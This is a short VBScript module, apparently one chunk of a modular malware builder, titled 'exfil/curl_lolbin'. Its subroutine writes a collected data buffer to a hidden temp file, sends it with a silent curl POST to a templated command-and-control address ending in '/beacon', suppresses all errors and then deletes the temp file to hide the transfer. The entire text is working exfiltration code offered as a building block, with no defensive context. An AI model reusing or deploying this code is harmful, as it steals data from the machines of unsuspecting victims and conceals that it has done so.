' chunk: exfil/curl_lolbin
' depends: core/emit_buffer, core/run_cmd, core/file_ops
' provides: exfil_curl
' format: vbscript

Sub exfil_curl()
    On Error Resume Next
    Dim tmp
    tmp = _sh.ExpandEnvironmentStrings("%TEMP%") & "\~exfil.dat"
    Dim f
    Set f = _fso.CreateTextFile(tmp, True)
    f.Write _buf
    f.Close
    Set f = Nothing
    _run "curl -s -X POST -d @""" & tmp & """ http://{{C2_IP}}:{{C2_PORT}}/beacon 2>NUL"
    _fso.DeleteFile tmp
    On Error GoTo 0
End Sub
